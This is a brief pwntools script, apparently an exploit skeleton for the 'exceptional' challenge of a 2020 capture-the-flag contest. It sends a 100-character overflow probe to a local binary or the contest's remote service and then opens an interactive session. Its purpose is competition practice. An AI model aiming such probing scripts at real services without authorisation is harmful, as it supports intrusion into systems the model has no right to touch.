from pwn import *

DEBUG = True
if DEBUG:
    p = process("./exceptional")
else:
    p = remote("exceptional.2020.ctfcompetition.com", 1337)
context.log_level = "debug"

payload = "a" * 100

p.sendlineafter("4. Quit\n", payload)
#p.sendlineafter("): ", "aaaa -1")

p.interactive()